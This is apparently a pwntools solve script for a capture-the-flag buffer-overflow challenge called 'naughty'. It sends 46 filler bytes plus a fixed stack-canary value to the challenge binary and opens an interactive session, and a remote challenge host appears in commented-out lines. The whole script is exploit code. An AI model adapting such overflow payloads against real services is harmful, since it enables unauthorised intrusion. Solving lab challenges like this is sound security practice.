from pwn import *

# -0x1b01
canary = pack(0xE4FF, 16)
sh = process('./naughty/chall')
# sock = remote('challs.xmas.htsp.ro', 2000)
# res = sock.recvline()
payload = b'A' * 46 + canary
print(payload)
# sock.sendline(payload)
# sock.interactive()

sh.sendline(payload)
sh.interactive()
